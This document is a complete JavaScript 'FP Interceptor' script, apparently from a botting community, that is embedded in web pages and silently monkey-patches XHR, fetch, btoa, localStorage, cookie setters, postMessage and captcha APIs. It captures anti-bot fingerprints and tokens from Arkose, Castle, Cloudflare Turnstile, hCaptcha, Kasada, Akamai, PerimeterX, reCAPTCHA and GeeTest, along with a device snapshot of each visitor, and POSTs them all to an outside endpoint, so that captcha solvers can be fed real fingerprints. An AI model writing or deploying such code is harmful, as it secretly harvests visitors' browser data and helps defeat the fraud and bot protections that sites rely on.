/**
 * FP Interceptor — hooks into anti-bot SDKs to capture THEIR fingerprint data.
 *
 * Instead of collecting fingerprints ourselves (which anti-bots can detect),
 * we let the REAL anti-bot SDK run and intercept its output.
 *
 * Supports:
 * - Arkose Labs (FunCaptcha) BDA interception
 * - Castle.io token interception
 * - Cloudflare Turnstile token interception
 * - hCaptcha HSW/HSJ fingerprint interception
 * - DataDome challenge interception
 *
 * Usage:
 *   <script src="interceptor.js" data-endpoint="https://your-server.com/api/intercept"></script>
 *
 * Or: FPInterceptor.init({ endpoint: "..." })
 *
 * Community approach (from Botting Art):
 * "Logs 1:1 real fp" — Fr0st3h
 * "my solver runs with 1.4k fp" — DCH
 * "posts a logger pings once and within seconds theres hundreds of fp logged" — Neon
 */

(function() {
    'use strict';

    var CONFIG = {
        endpoint: '',
        interceptArkose: true,
        interceptCastle: true,
        interceptCloudflare: true,
        interceptHcaptcha: true,
        interceptKasada: true,
        interceptShape: true,
        interceptAkamai: true,
        interceptPerimeterX: true,
        interceptRecaptcha: true,
        interceptGeeTest: true,
        decodeBDA: true,
        silent: true,
    };

    // Read config from script tag
    var scripts = document.getElementsByTagName('script');
    var currentScript = scripts[scripts.length - 1];
    if (currentScript) {
        CONFIG.endpoint = currentScript.getAttribute('data-endpoint') || CONFIG.endpoint;
    }

    var captured = [];

    function send(data) {
        if (!CONFIG.endpoint) return;
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', CONFIG.endpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        } catch(e) {}
    }

    // ═══════════════════════════════════════════════════
    // ARKOSE LABS (FunCaptcha) BDA Interception
    // ═══════════════════════════════════════════════════
    // BDA = Browser Data Attestation — the full fingerprint Arkose collects
    // It's built by their enforcement.js VM and sent as "bda" parameter

    function hookArkose() {
        // Hook XMLHttpRequest to catch BDA submissions
        var _xhrSend = XMLHttpRequest.prototype.send;
        var _xhrOpen = XMLHttpRequest.prototype.open;

        XMLHttpRequest.prototype.open = function(method, url) {
            this._fpUrl = url;
            return _xhrOpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = function(body) {
            if (this._fpUrl && body) {
                var bodyStr = typeof body === 'string' ? body : '';

                // Catch Arkose BDA submission
                if (bodyStr.includes('bda=') || (this._fpUrl.includes('fc/gt2') && bodyStr.includes('bda'))) {
                    try {
                        var params = {};
                        bodyStr.split('&').forEach(function(p) {
                            var kv = p.split('=');
                            params[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1] || '');
                        });

                        if (params.bda) {
                            var entry = {
                                type: 'arkose_bda',
                                bda: params.bda,
                                rnd: params.rnd || '',
                                site: params.site || '',
                                userAgent: navigator.userAgent,
                                timestamp: Date.now(),
                                url: window.location.href,
                            };
                            captured.push(entry);
                            send(entry);
                            if (!CONFIG.silent) console.log('[FP] Arkose BDA captured:', params.bda.length, 'chars');
                        }
                    } catch(e) {}
                }

                // Catch Arkose token submission (solved challenge)
                if (this._fpUrl.includes('fc/ca') || this._fpUrl.includes('fc/gfct')) {
                    try {
                        var entry = {
                            type: 'arkose_token',
                            url: this._fpUrl,
                            body: bodyStr.substring(0, 5000),
                            timestamp: Date.now(),
                        };
                        captured.push(entry);
                        send(entry);
                    } catch(e) {}
                }
            }

            // Catch Castle.io token submission
            if (this._fpUrl && this._fpUrl.includes('castle.io')) {
                try {
                    send({
                        type: 'castle_request',
                        url: this._fpUrl,
                        body: typeof body === 'string' ? body.substring(0, 5000) : '',
                        timestamp: Date.now(),
                    });
                } catch(e) {}
            }

            return _xhrSend.apply(this, arguments);
        };

        // Also hook fetch for modern implementations
        var _fetch = window.fetch;
        if (_fetch) {
            window.fetch = function(url, opts) {
                var urlStr = typeof url === 'string' ? url : (url && url.url) || '';
                if (opts && opts.body) {
                    var bodyStr = typeof opts.body === 'string' ? opts.body : '';

                    // Arkose BDA via fetch
                    if (bodyStr.includes('bda=') && (urlStr.includes('arkoselabs') || urlStr.includes('funcaptcha'))) {
                        try {
                            var params = {};
                            bodyStr.split('&').forEach(function(p) {
                                var kv = p.split('=');
                                params[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1] || '');
                            });
                            if (params.bda) {
                                send({
                                    type: 'arkose_bda',
                                    bda: params.bda,
                                    site: params.site || '',
                                    userAgent: navigator.userAgent,
                                    timestamp: Date.now(),
                                });
                            }
                        } catch(e) {}
                    }

                    // Castle token via fetch
                    if (urlStr.includes('castle') || (bodyStr.includes('castle_token') || bodyStr.includes('X-Castle-Request-Token'))) {
                        try {
                            var data = JSON.parse(bodyStr);
                            // Look for castle_token in nested objects
                            function findCastle(obj) {
                                if (!obj || typeof obj !== 'object') return;
                                for (var k in obj) {
                                    if (k === 'castle_token' && typeof obj[k] === 'string' && obj[k].length > 100) {
                                        send({
                                            type: 'castle_token',
                                            token: obj[k],
                                            url: urlStr,
                                            userAgent: navigator.userAgent,
                                            timestamp: Date.now(),
                                        });
                                        return;
                                    }
                                    findCastle(obj[k]);
                                }
                            }
                            findCastle(data);
                        } catch(e) {}
                    }

                    // Cloudflare Turnstile
                    if (urlStr.includes('challenges.cloudflare.com') || bodyStr.includes('cf-turnstile-response')) {
                        send({
                            type: 'cloudflare_turnstile',
                            url: urlStr,
                            body: bodyStr.substring(0, 5000),
                            timestamp: Date.now(),
                        });
                    }
                }

                return _fetch.apply(this, arguments);
            };
        }
    }

    // ═══════════════════════════════════════════════════
    // CASTLE.IO Token Interception
    // ═══════════════════════════════════════════════════

    function hookCastle() {
        // Hook btoa — Castle's final step is base64url encoding the token
        var _btoa = window.btoa;
        window.btoa = function(s) {
            var result = _btoa.call(this, s);
            // Castle tokens are large (1500+ bytes raw → 2000+ chars base64)
            if (s.length > 1000) {
                var bytes = new Uint8Array(s.length);
                for (var i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);

                send({
                    type: 'castle_btoa',
                    length: s.length,
                    base64Length: result.length,
                    rawBytes: Array.from(bytes.slice(0, 100)),
                    userAgent: navigator.userAgent,
                    timestamp: Date.now(),
                });
            }
            return result;
        };

        // Hook localStorage for __cuid
        var _lsSet = localStorage.setItem.bind(localStorage);
        localStorage.setItem = function(key, val) {
            if (key === '__cuid' || key.includes('castle')) {
                send({
                    type: 'castle_storage',
                    key: key,
                    value: String(val).substring(0, 200),
                    timestamp: Date.now(),
                });
            }
            return _lsSet(key, val);
        };
    }

    // ═══════════════════════════════════════════════════
    // HCAPTCHA HSW/HSJ Interception
    // ═══════════════════════════════════════════════════

    function hookHcaptcha() {
        // hCaptcha sends HSW (Hardware Security Worker) data
        // Hook postMessage — hCaptcha iframe communicates via postMessage
        var _pm = window.postMessage.bind(window);
        window.addEventListener('message', function(e) {
            if (e.data && typeof e.data === 'string' && e.data.length > 500) {
                try {
                    var data = JSON.parse(e.data);
                    if (data.source === 'hcaptcha' || data.label === 'challenge-closed' || data.response) {
                        send({
                            type: 'hcaptcha_message',
                            data: e.data.substring(0, 5000),
                            origin: e.origin,
                            timestamp: Date.now(),
                        });
                    }
                } catch(ex) {
                    // May not be JSON — could be hsw/hsj token
                    if (e.data.includes('hsw') || e.data.includes('hsj') || e.data.length > 2000) {
                        send({
                            type: 'hcaptcha_token',
                            token: e.data.substring(0, 5000),
                            origin: e.origin,
                            timestamp: Date.now(),
                        });
                    }
                }
            }
        }, true);
    }

    // ═══════════════════════════════════════════════════
    // KASADA Interception (x-kpsdk-* headers)
    // ═══════════════════════════════════════════════════

    function hookKasada() {
        // Hook XHR to capture x-kpsdk-* headers
        var _xhrSetHeader = XMLHttpRequest.prototype.setRequestHeader;
        XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
            if (name && name.toLowerCase().indexOf('x-kpsdk-') === 0) {
                var entry = {
                    type: 'kasada_header',
                    header: name,
                    value: String(value).substring(0, 5000),
                    url: this._fpUrl || '',
                    timestamp: Date.now(),
                };
                captured.push(entry);
                send(entry);
                if (!CONFIG.silent) console.log('[FP] Kasada header captured:', name);
            }
            return _xhrSetHeader.apply(this, arguments);
        };

        // Hook fetch for Kasada headers
        var _origFetch = window.fetch;
        if (_origFetch && !window._fpKasadaHooked) {
            window._fpKasadaHooked = true;
            var _prevFetch = window.fetch;
            window.fetch = function(url, opts) {
                if (opts && opts.headers) {
                    var headers = opts.headers;
                    // Handle Headers object, plain object, or array
                    var entries = [];
                    if (headers instanceof Headers) {
                        headers.forEach(function(val, key) { entries.push([key, val]); });
                    } else if (Array.isArray(headers)) {
                        entries = headers;
                    } else if (typeof headers === 'object') {
                        for (var k in headers) entries.push([k, headers[k]]);
                    }
                    for (var i = 0; i < entries.length; i++) {
                        if (entries[i][0] && entries[i][0].toLowerCase().indexOf('x-kpsdk-') === 0) {
                            send({
                                type: 'kasada_header',
                                header: entries[i][0],
                                value: String(entries[i][1]).substring(0, 5000),
                                url: typeof url === 'string' ? url : (url && url.url) || '',
                                timestamp: Date.now(),
                            });
                        }
                    }
                }
                return _prevFetch.apply(this, arguments);
            };
        }
    }

    // ═══════════════════════════════════════════════════
    // SHAPE SECURITY / F5 Interception
    // ═══════════════════════════════════════════════════

    function hookShape() {
        // Monitor _imp_apg_r_ cookie (Shape telemetry cookie)
        var _cookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
                          Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');

        if (_cookieDesc && _cookieDesc.set) {
            var _origCookieSet = _cookieDesc.set;
            Object.defineProperty(document, 'cookie', {
                get: _cookieDesc.get,
                set: function(val) {
                    if (val && (val.indexOf('_imp_apg_r_') !== -1 || val.indexOf('_imp_') !== -1)) {
                        send({
                            type: 'shape_cookie',
                            cookie: String(val).substring(0, 5000),
                            timestamp: Date.now(),
                            url: window.location.href,
                        });
                        if (!CONFIG.silent) console.log('[FP] Shape cookie captured');
                    }
                    return _origCookieSet.call(this, val);
                },
                configurable: true
            });
        }

        // Hook XHR/fetch for Shape telemetry blobs (large encoded payloads)
        var _xhrSendShape = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            if (this._fpUrl && body && typeof body === 'string' && body.length > 2000) {
                // Shape sends large sensor data blobs
                if (this._fpUrl.indexOf('/tspd/') !== -1 || this._fpUrl.indexOf('/_imp/') !== -1 || this._fpUrl.indexOf('/TSc') !== -1) {
                    send({
                        type: 'shape_telemetry',
                        url: this._fpUrl,
                        bodyLength: body.length,
                        bodySample: body.substring(0, 3000),
                        timestamp: Date.now(),
                    });
                    if (!CONFIG.silent) console.log('[FP] Shape telemetry captured:', body.length, 'chars');
                }
            }
            return _xhrSendShape.apply(this, arguments);
        };
    }

    // ═══════════════════════════════════════════════════
    // AKAMAI Bot Manager Interception (_abck cookie + sensor)
    // ═══════════════════════════════════════════════════

    function hookAkamai() {
        // Monitor _abck cookie
        var _akCookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
                            Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');

        if (_akCookieDesc && _akCookieDesc.set) {
            var _origAkSet = _akCookieDesc.set;
            Object.defineProperty(document, 'cookie', {
                get: _akCookieDesc.get,
                set: function(val) {
                    if (val && (val.indexOf('_abck=') !== -1 || val.indexOf('ak_bmsc=') !== -1 || val.indexOf('bm_sz=') !== -1)) {
                        send({
                            type: 'akamai_cookie',
                            cookie: String(val).substring(0, 5000),
                            timestamp: Date.now(),
                            url: window.location.href,
                        });
                        if (!CONFIG.silent) console.log('[FP] Akamai cookie captured');
                    }
                    return _origAkSet.call(this, val);
                },
                configurable: true
            });
        }

        // Hook XHR for sensor data submission
        // Akamai sensor is typically POSTed to the page URL or a specific path
        var _xhrSendAk = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            if (body && typeof body === 'string') {
                // Akamai sensor data starts with specific patterns
                if (body.indexOf('sensor_data=') !== -1 || (body.length > 1000 && body.indexOf('7a74G7m23Vrp0o5c') !== -1)) {
                    send({
                        type: 'akamai_sensor',
                        url: this._fpUrl || '',
                        bodyLength: body.length,
                        bodySample: body.substring(0, 5000),
                        timestamp: Date.now(),
                    });
                    if (!CONFIG.silent) console.log('[FP] Akamai sensor data captured:', body.length, 'chars');
                }
            }
            return _xhrSendAk.apply(this, arguments);
        };
    }

    // ═══════════════════════════════════════════════════
    // PERIMETERX / HUMAN Interception (_px* cookies + telemetry)
    // ═══════════════════════════════════════════════════

    function hookPerimeterX() {
        // Monitor _px cookies
        var _pxCookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
                            Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');

        if (_pxCookieDesc && _pxCookieDesc.set) {
            var _origPxSet = _pxCookieDesc.set;
            Object.defineProperty(document, 'cookie', {
                get: _pxCookieDesc.get,
                set: function(val) {
                    if (val && (val.indexOf('_px') !== -1 || val.indexOf('_pxhd') !== -1 || val.indexOf('_pxvid') !== -1 || val.indexOf('_pxde') !== -1)) {
                        send({
                            type: 'perimeterx_cookie',
                            cookie: String(val).substring(0, 5000),
                            timestamp: Date.now(),
                            url: window.location.href,
                        });
                        if (!CONFIG.silent) console.log('[FP] PerimeterX cookie captured');
                    }
                    return _origPxSet.call(this, val);
                },
                configurable: true
            });
        }

        // Hook XHR/fetch for PX telemetry (collector endpoint)
        var _fetchPx = window.fetch;
        if (_fetchPx) {
            window.fetch = function(url, opts) {
                var urlStr = typeof url === 'string' ? url : (url && url.url) || '';
                if (urlStr.indexOf('/xhr/api/v2/collector') !== -1 || urlStr.indexOf('/assets/js/bundle') !== -1 || urlStr.indexOf('/api/v2/collector') !== -1) {
                    var bodyStr = opts && opts.body ? (typeof opts.body === 'string' ? opts.body : '') : '';
                    send({
                        type: 'perimeterx_telemetry',
                        url: urlStr,
                        bodyLength: bodyStr.length,
                        bodySample: bodyStr.substring(0, 5000),
                        timestamp: Date.now(),
                    });
                    if (!CONFIG.silent) console.log('[FP] PerimeterX telemetry captured');
                }
                return _fetchPx.apply(this, arguments);
            };
        }
    }

    // ═══════════════════════════════════════════════════
    // reCAPTCHA / BotGuard Interception
    // ═══════════════════════════════════════════════════

    function hookRecaptcha() {
        // Hook grecaptcha.enterprise.execute to capture the bg parameter and token
        function tryHookGrecaptcha() {
            if (window.grecaptcha && window.grecaptcha.enterprise && window.grecaptcha.enterprise.execute) {
                var _origExecute = window.grecaptcha.enterprise.execute;
                window.grecaptcha.enterprise.execute = function(siteKey, options) {
                    var result = _origExecute.apply(this, arguments);
                    if (result && typeof result.then === 'function') {
                        result.then(function(token) {
                            send({
                                type: 'recaptcha_token',
                                siteKey: siteKey,
                                action: options ? options.action : null,
                                token: String(token).substring(0, 5000),
                                tokenLength: String(token).length,
                                timestamp: Date.now(),
                                url: window.location.href,
                            });
                            if (!CONFIG.silent) console.log('[FP] reCAPTCHA token captured:', String(token).length, 'chars');
                        });
                    }
                    return result;
                };
                return true;
            }
            return false;
        }

        // Try immediately and retry on interval (grecaptcha loads async)
        if (!tryHookGrecaptcha()) {
            var attempts = 0;
            var interval = setInterval(function() {
                if (tryHookGrecaptcha() || ++attempts > 50) clearInterval(interval);
            }, 200);
        }

        // Also hook postMessage for BotGuard bg parameter exchange between iframes
        window.addEventListener('message', function(e) {
            if (e.data && typeof e.data === 'object') {
                // reCAPTCHA iframe communication often includes bg payload
                var data = e.data;
                if (data[0] === 'recaptcha-setup' || data[0] === 'recaptcha-token' ||
                    (typeof data === 'string' && data.length > 1000 && (data.indexOf('recaptcha') !== -1 || data.indexOf('bgdata') !== -1))) {
                    send({
                        type: 'recaptcha_iframe_message',
                        data: JSON.stringify(data).substring(0, 5000),
                        origin: e.origin,
                        timestamp: Date.now(),
                    });
                }
            }
        }, true);
    }

    // ═══════════════════════════════════════════════════
    // GEETEST Challenge Interception
    // ═══════════════════════════════════════════════════

    function hookGeeTest() {
        // Hook XHR for GeeTest verification requests
        var _xhrSendGT = XMLHttpRequest.prototype.send;
        var _xhrOpenGT = XMLHttpRequest.prototype.open;

        XMLHttpRequest.prototype.open = function(method, url) {
            this._fpUrlGT = url;
            return _xhrOpenGT.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = function(body) {
            if (this._fpUrlGT) {
                var url = String(this._fpUrlGT);
                // GeeTest endpoints
                if (url.indexOf('geetest.com') !== -1 || url.indexOf('/gt/') !== -1 ||
                    url.indexOf('api.geetest.com') !== -1 || url.indexOf('gcaptcha') !== -1) {
                    send({
                        type: 'geetest_request',
                        url: url,
                        body: body ? String(body).substring(0, 5000) : '',
                        timestamp: Date.now(),
                    });
                    if (!CONFIG.silent) console.log('[FP] GeeTest request captured');
                }
            }
            return _xhrSendGT.apply(this, arguments);
        };

        // Hook for GeeTest widget callback
        if (window.initGeetest || window.initGeetest4) {
            var hookGTCallback = function(origInit) {
                return function(config, callback) {
                    var wrappedCallback = function(captchaObj) {
                        // Hook the validate result
                        if (captchaObj && captchaObj.getValidate) {
                            var _origGetValidate = captchaObj.getValidate;
                            captchaObj.getValidate = function() {
                                var result = _origGetValidate.apply(this, arguments);
                                if (result) {
                                    send({
                                        type: 'geetest_validate',
                                        data: JSON.stringify(result).substring(0, 5000),
                                        timestamp: Date.now(),
                                    });
                                }
                                return result;
                            };
                        }
                        if (callback) callback(captchaObj);
                    };
                    return origInit.call(this, config, wrappedCallback);
                };
            };
            if (window.initGeetest) window.initGeetest = hookGTCallback(window.initGeetest);
            if (window.initGeetest4) window.initGeetest4 = hookGTCallback(window.initGeetest4);
        }
    }

    // ═══════════════════════════════════════════════════
    // ARKOSE BDA Decoder (base64 → JSON → individual fields)
    // ═══════════════════════════════════════════════════

    function decodeBDA(bdaBase64) {
        try {
            var decoded = atob(bdaBase64);
            var parsed = JSON.parse(decoded);
            return {
                decoded: true,
                fieldCount: Array.isArray(parsed) ? parsed.length : Object.keys(parsed).length,
                fields: parsed,
            };
        } catch(e) {
            // Try URL-decoded first
            try {
                var urlDecoded = decodeURIComponent(bdaBase64);
                var decoded2 = atob(urlDecoded);
                var parsed2 = JSON.parse(decoded2);
                return {
                    decoded: true,
                    fieldCount: Array.isArray(parsed2) ? parsed2.length : Object.keys(parsed2).length,
                    fields: parsed2,
                };
            } catch(e2) {
                return { decoded: false, error: e.message, raw: bdaBase64.substring(0, 200) };
            }
        }
    }

    // Enhance the existing Arkose hook to auto-decode BDA
    function enhanceArkoseBDA() {
        // Wrap the existing captured array push to auto-decode BDA entries
        var origPush = captured.push.bind(captured);
        captured.push = function(entry) {
            if (entry && entry.type === 'arkose_bda' && entry.bda) {
                entry.bdaDecoded = decodeBDA(entry.bda);
            }
            return origPush(entry);
        };
    }

    // ═══════════════════════════════════════════════════
    // ENVIRONMENT SNAPSHOT (collected once on load)
    // ═══════════════════════════════════════════════════

    function collectEnvironment() {
        var env = {
            type: 'environment',
            timestamp: Date.now(),
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? Array.from(navigator.languages) : [],
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            webdriver: navigator.webdriver,
            vendor: navigator.vendor,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
        };
        send(env);
    }

    // ═══════════════════════════════════════════════════
    // INIT
    // ═══════════════════════════════════════════════════

    function init(config) {
        if (config) {
            for (var k in config) CONFIG[k] = config[k];
        }

        if (CONFIG.interceptArkose) hookArkose();
        if (CONFIG.interceptCastle) hookCastle();
        if (CONFIG.interceptHcaptcha) hookHcaptcha();
        if (CONFIG.interceptKasada) hookKasada();
        if (CONFIG.interceptShape) hookShape();
        if (CONFIG.interceptAkamai) hookAkamai();
        if (CONFIG.interceptPerimeterX) hookPerimeterX();
        if (CONFIG.interceptRecaptcha) hookRecaptcha();
        if (CONFIG.interceptGeeTest) hookGeeTest();
        if (CONFIG.decodeBDA) enhanceArkoseBDA();

        collectEnvironment();

        if (!CONFIG.silent) console.log('[FP Interceptor] Active — monitoring Arkose, Castle, Cloudflare, hCaptcha, Kasada, Shape, Akamai, PerimeterX, reCAPTCHA, GeeTest');
    }

    // Auto-init on load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() { init(); });
    } else {
        init();
    }

    // Public API
    window.FPInterceptor = {
        init: init,
        getCaptured: function() { return captured; },
        decodeBDA: decodeBDA,
    };
})();
